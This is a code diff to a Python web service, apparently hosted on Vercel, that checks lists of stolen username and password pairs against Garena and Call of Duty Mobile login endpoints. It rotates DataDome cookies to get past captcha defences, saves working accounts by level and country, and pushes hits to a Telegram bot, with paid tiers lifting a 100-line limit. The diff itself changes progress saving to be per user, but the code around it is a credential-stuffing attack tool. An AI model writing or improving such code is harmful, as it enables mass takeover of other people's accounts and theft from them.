@@ -93,8 +93,6 @@ GREEN = "\033[32m"
 apkrov = "https://auth.garena.com/api/login?"
 redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
 datenok = str(int(time.time()))
-PROGRESS_STATE_FILE = os.path.join(APP_DATA_DIR, 'progress_state.json')
-
 
 COUNTRY_KEYWORD_MAP = {
     "PH": ["PHILIPPINES", "PH"], "ID": ["INDONESIA", "ID"], "US": ["UNITED STATES", "USA", "US"],
@@ -505,46 +503,67 @@ def remove_duplicates_from_file(file_path):
             lines = [line for line in f.read().splitlines() if line.strip()]
         return lines, len(lines)
 
-def save_progress(file_path, index):
+# --- START OF MODIFIED PROGRESS MANAGEMENT ---
+
+def get_progress_file_path(user_info):
+    """Returns a user-specific path for the progress state file."""
+    if not user_info or 'username' not in user_info:
+        return None  # Cannot create a user-specific file
+    username = secure_filename(user_info['username'])
+    return os.path.join(APP_DATA_DIR, f'progress_{username}.json')
+
+def save_progress(file_path, index, user_info):
+    """Saves the progress for a specific user."""
+    progress_file = get_progress_file_path(user_info)
+    if not progress_file:
+        return
     state = {'source_file_path': file_path, 'last_processed_index': index}
     try:
-        with open(PROGRESS_STATE_FILE, 'w') as f:
+        with open(progress_file, 'w') as f:
             json.dump(state, f)
     except IOError:
-        pass # Fail silently if we can't save progress
+        pass  # Fail silently if we can't save progress
 
-def load_progress():
-    if not os.path.exists(PROGRESS_STATE_FILE):
+def load_progress(user_info):
+    """Loads the progress for a specific user."""
+    progress_file = get_progress_file_path(user_info)
+    if not progress_file or not os.path.exists(progress_file):
         return None
     try:
-        with open(PROGRESS_STATE_FILE, 'r') as f:
+        with open(progress_file, 'r') as f:
             return json.load(f)
     except (IOError, json.JSONDecodeError):
         return None
 
-def clear_progress():
-    if os.path.exists(PROGRESS_STATE_FILE):
-        os.remove(PROGRESS_STATE_FILE)
+def clear_progress(user_info):
+    """Clears the progress for a specific user."""
+    progress_file = get_progress_file_path(user_info)
+    if progress_file and os.path.exists(progress_file):
+        try:
+            os.remove(progress_file)
+        except OSError:
+            pass
 
-# MODIFIED: Add user_info parameter
+# --- END OF MODIFIED PROGRESS MANAGEMENT ---
+
+
 def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_cookie_module_name, use_cookie_set, auto_delete, force_restart, telegram_level_filter, fixed_cookie_number=0, user_info=None):
     """The main background task for checking accounts."""
     global check_status, stop_event, captcha_pause_event
     
-    # WARNING: On Vercel, this task will be terminated after a short time (e.g., 60 seconds).
-    # It is not suitable for large account lists.
     log_message("[⚠️ VERCEL NOTE] Checker is running on a serverless platform. Task will be terminated after the timeout limit.", "text-warning")
 
     is_complete = False
     try:
-        # --- Progress Handling ---
+        # --- MODIFIED: USER-AWARE PROGRESS HANDLING ---
         if force_restart:
-            clear_progress()
+            clear_progress(user_info)
             log_message("[🔄] Forced restart. Previous progress has been cleared.", "text-info")
 
         start_from_index = 0
-        progress_data = load_progress()
+        progress_data = load_progress(user_info)
         if progress_data and progress_data.get('source_file_path') == file_path:
+            # Resume only if the file path matches to avoid resuming on a different list
             start_from_index = progress_data.get('last_processed_index', -1) + 1
             if start_from_index > 0:
                 log_message(f"[🔄] Resuming session from line {start_from_index + 1}.", "text-info")
@@ -552,7 +571,6 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
         # Select cookie module based on name
         selected_cookie_module = getattr(sys.modules[__name__], selected_cookie_module_name)
 
-        # NEW: Set the fixed cookie number if provided
         if selected_cookie_module_name == 'set_cookie' and fixed_cookie_number > 0:
             set_cookie.set_fixed_number(fixed_cookie_number)
             log_message(f"[⚙️] Numbered Set is locked to use ONLY cookie #{fixed_cookie_number}.", "text-info")
@@ -568,7 +586,6 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
 
         accounts, total_accounts = remove_duplicates_from_file(file_path)
         
-        # --- USAGE LIMIT ---
         if user_info and not user_info.get('upgraded', False) and total_accounts > 100:
             log_message(f"[⚠️] Free account limit reached. Processing only the first 100 lines out of {total_accounts}.", "text-warning")
             accounts = accounts[:100]
@@ -621,7 +638,6 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                 is_captcha_loop = True
                 while is_captcha_loop and not stop_event.is_set():
                     
-                    # --- Upgraded Cookie Selection with Cooldown ---
                     current_datadome = None
                     if not cookie_state['pool']:
                         log_message("[❌] No cookies available in the pool. Stopping check.", "text-danger")
@@ -660,7 +676,7 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                         time.sleep(random.uniform(2, 4))
                         
                         captcha_pause_event.clear()
-                        captcha_pause_event.wait(timeout=30) # Add timeout to prevent hanging on Vercel
+                        captcha_pause_event.wait(timeout=30)
                         
                         with status_lock:
                             check_status['captcha_detected'] = False
@@ -676,7 +692,6 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
 
                 if stop_event.is_set(): break
                 
-                # Process result
                 if isinstance(result, tuple):
                     console_message, telegram_message, codm_level_num, country, user, pwd, shell, has_codm, is_clean, file_to_write, content_to_write = result
                     log_message(console_message, "text-success")
@@ -687,7 +702,6 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                     os.makedirs(os.path.dirname(file_to_write), exist_ok=True)
                     with open(file_to_write, "a", encoding="utf-8") as f: f.write(content_to_write)
                     
-                    # --- NEW TELEGRAM LOGIC ---
                     if telegram_message and telegram_bot_token and telegram_chat_id and telegram_level_filter != 'none':
                         send_notification = False
                         if telegram_level_filter == 'all':
@@ -717,9 +731,9 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
             with status_lock:
                 check_status['stats'] = stats.copy()
             
-            save_progress(file_path, original_index)
+            # MODIFIED: Save progress after every line for the current user
+            save_progress(file_path, original_index, user_info)
         
-        # --- Final Summary ---
         if not stop_event.is_set():
             is_complete = True
             with status_lock:
@@ -729,14 +743,14 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
             log_message("--- CHECKING COMPLETE ---", "text-success")
             log_message("[VERCEL NOTE] All saved files are temporary and will be deleted.", "text-warning")
 
-
     except Exception as e:
         log_message(f"An unexpected error occurred in the checker task: {e}", "text-danger")
         import traceback
         log_message(traceback.format_exc(), "text-danger")
     finally:
+        # MODIFIED: Only clear progress on full completion
         if is_complete:
-            clear_progress()
+            clear_progress(user_info)
             if auto_delete:
                 try:
                     os.remove(file_path)
